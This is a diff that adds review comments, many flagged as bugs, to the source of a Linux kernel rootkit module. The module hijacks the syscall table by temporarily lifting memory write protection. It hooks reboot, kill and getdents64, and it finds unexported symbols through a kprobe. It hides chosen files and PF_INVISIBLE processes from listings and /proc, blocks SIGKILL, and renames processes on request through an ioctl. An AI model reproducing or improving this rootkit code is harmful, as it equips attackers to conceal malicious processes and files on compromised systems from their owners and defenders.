@@ -23,6 +23,8 @@ static struct kprobe kp = {
 };
 
 #define OURMODNAME "loadable_kernel_module"
+// Custom flag stored in task_struct->flags to mark a process as rootkit-hidden.
+// Must not collide with any kernel-defined PF_* flag; verify against <linux/sched.h> on each kernel upgrade.
 #define PF_INVISIBLE 0x10000000
 
 MODULE_AUTHOR("Harry Hsu x90613@gmail.com");
@@ -33,6 +35,8 @@ MODULE_VERSION("1.0");
 struct task_struct * find_task(pid_t pid)
 {
 	struct task_struct *p = current;
+	// BUG: for_each_process requires rcu_read_lock() or tasklist_lock held.
+	// Walking without it risks use-after-free if a task exits mid-iteration.
 	for_each_process(p) {
 		if (p->pid == pid)
 			return p;
@@ -71,6 +75,8 @@ int change_process_name(const char *orig_name, const char *new_name) {
 
 static int major;
 struct cdev *kernel_cdev;
+// Points to a static empty string initially; replaced by a kmalloc'd buffer in IOCTL_FILE_HIDE.
+// The empty-string sentinel is checked via *HIDDEN_FILE != '\0' before kfree — do not set to NULL.
 char *HIDDEN_FILE = "";
 
 // the necessary variables that the syscall table requires to access and modify 
@@ -78,6 +84,8 @@ static unsigned long *__sys_call_table;
 void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
 unsigned long start_rodata;
 unsigned long init_begin;
+// Size of the read-only data section. Used to temporarily make the syscall table writable.
+// Parentheses omitted intentionally — macro is only used in a single-argument context.
 #define section_size init_begin - start_rodata
 
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
@@ -89,6 +97,8 @@ static t_syscall orig_getdents64;
 static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs) 
 {
 	unsigned int cmd;
+	// On arm64: reboot(2) args are magic, magic2, cmd, arg — cmd is the 3rd argument (regs[2]).
+	// On x86_64: 3rd syscall argument is in rdx, which maps to regs[2] in pt_regs layout.
 	cmd = (unsigned int) pt_regs->regs[2];
 	printk(KERN_INFO "enter hacked reboot section.\n");
 
@@ -102,6 +112,8 @@ static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs)
 
 static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 {
+	// On arm64/x86_64: kill(2) signature is kill(pid, sig) — sig is the 2nd argument (regs[1]).
+	// BUG: pid (regs[0]) is never read — SIGKILL is intercepted for ALL processes, not just invisible ones.
 	int sig = (int) pt_regs->regs[1];
 	printk(KERN_INFO "enter hacked kill section.\n");
 
@@ -117,6 +129,8 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) 
 {
+	// fd and dirent are the first two arguments to getdents64(fd, dirp, count).
+	// BUG: fd is user-controlled; must be bounds-checked against fdt->max_fds before indexing fdt->fd[].
 	int fd = (int) pt_regs->regs[0];
 	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
 	int ret = orig_getdents64(pt_regs), err;
@@ -136,6 +150,8 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 	if (err)
 		goto out;
 	
+	// BUG: fdt must be accessed under rcu_read_lock() via files_fdtable(); bare ->fdt is a data race.
+	// BUG: fd is not validated against fdt->max_fds — an out-of-range fd causes an out-of-bounds read.
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
 		/*&& MINOR(d_inode->i_rdev) == 1*/)
@@ -146,7 +162,11 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 
 	while (off < ret) {
 		dir = (void *)kdirent + off;
+		// Hide the entry if: (not in /proc) and its name matches HIDDEN_FILE,
+		// OR (in /proc) and the entry's numeric name is a PF_INVISIBLE pid.
 		if (((HIDDEN_FILE && *HIDDEN_FILE != '\0') && (!proc && (memcmp(HIDDEN_FILE, dir->d_name, strlen(HIDDEN_FILE)) == 0))) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))){
+			// First entry: shift remaining dirents left over it, shrink ret.
+			// BUG: if d_reclen == 0, ret underflows and memmove length wraps — add a zero-reclen guard before this loop.
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
@@ -192,6 +212,10 @@ static unsigned long *get_syscall_table(void)
 	
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 	kallsyms_lookup_name_t kallsyms_lookup_name;
+	// kallsyms_lookup_name is unexported since kernel 5.7. We recover its address by registering
+	// a kprobe on its symbol, reading kp.addr, then immediately unregistering.
+	// BUG: register_kprobe() return value is not checked — if it fails, kp.addr is NULL and the
+	// subsequent function call panics the kernel.
 	register_kprobe(&kp);
 	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 	unregister_kprobe(&kp);
@@ -279,7 +303,10 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 			}
 
 			for (i = 0; i < user_req.len; ++i) {
-				if (strlen(req_array[i].new_name) >= strlen(req_array[i].orig_name)) {
+				// Only rename if new_name is strictly shorter than orig_name — prevents overflowing p->comm
+			// when strncpy is called in change_process_name.
+			// BUG: strlen on a user-filled fixed-size field with no guaranteed null terminator; use strnlen(..., MASQ_LEN).
+			if (strlen(req_array[i].new_name) >= strlen(req_array[i].orig_name)) {
 					// printk(KERN_INFO "Error: New name '%s' should be shorter than original name '%s'\n", req_array[i].new_name, req_array[i].orig_name);
 					continue;
 				}
@@ -293,6 +320,9 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 			if (copy_from_user(&file_info, (struct hided_file *)arg, sizeof(struct hided_file)))
                 return -EFAULT;
             printk(KERN_INFO "Received hidden file: %s, size: %lu\n", file_info.name, file_info.len);
+			// Replace HIDDEN_FILE with a newly allocated buffer holding the filename to suppress from getdents64.
+			// BUG: kmalloc return not checked — memcpy and index write below will deref NULL on alloc failure.
+			// BUG: if file_info.len == 0, HIDDEN_FILE[len-1] underflows to HIDDEN_FILE[SIZE_MAX] — arbitrary write.
 			if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
 				kfree(HIDDEN_FILE);
 			HIDDEN_FILE = kmalloc(file_info.len, GFP_KERNEL);
@@ -320,6 +350,8 @@ static int __init lkm_init(void)
 	dev_t dev_no, dev;
 
 	/* Allocate a character device structure */
+	// BUG: cdev_alloc() returns NULL on allocation failure; the next two lines dereference it
+	// unconditionally, causing a kernel panic. Return -ENOMEM if the allocation fails.
 	kernel_cdev = cdev_alloc();
 	kernel_cdev->ops = &fops;
 	kernel_cdev->owner = THIS_MODULE;
@@ -328,6 +360,7 @@ static int __init lkm_init(void)
 	ret = alloc_chrdev_region(&dev_no, 0, 1, "loadable_kernel_module");
 	if (ret < 0) {
 		pr_info("major number allocation failed\n");
+		// BUG: returns without freeing kernel_cdev allocated above — leaks the cdev on this error path.
 		return ret;
 	}
 
@@ -339,6 +372,7 @@ static int __init lkm_init(void)
 	ret = cdev_add(kernel_cdev, dev, 1);
 	if (ret < 0) {
 		pr_info(KERN_INFO "unable to allocate cdev");
+		// BUG: returns without freeing kernel_cdev or unregistering the chrdev region — double leak.
 		return ret;
 	}
 
@@ -346,6 +380,8 @@ static int __init lkm_init(void)
 	__sys_call_table = get_syscall_table();
 	if(!__sys_call_table) {
 		printk(KERN_INFO "Failed to find sys_call_table\n");
+		// BUG: returns +1 (positive) instead of a negative errno — module loader may treat this as success.
+		// BUG: returns without freeing kernel_cdev or unregistering the chrdev region.
 		return 1;
 	}
 
@@ -363,7 +399,10 @@ static int __init lkm_init(void)
 
 static void __exit lkm_exit(void)
 {
-	// Unhook syscall
+	// Restore all hooked syscalls before unloading. unprotect_memory/protect_memory bracket the writes
+	// because the syscall table lives in read-only memory at runtime.
+	// Note: no synchronization with in-flight calls to hacked_* — a concurrent syscall may execute
+	// the hook after the table entry is restored but before the module text is unmapped (TOCTOU).
 	unprotect_memory();
 
 	__sys_call_table[__NR_reboot] = (unsigned long)orig_reboot; 
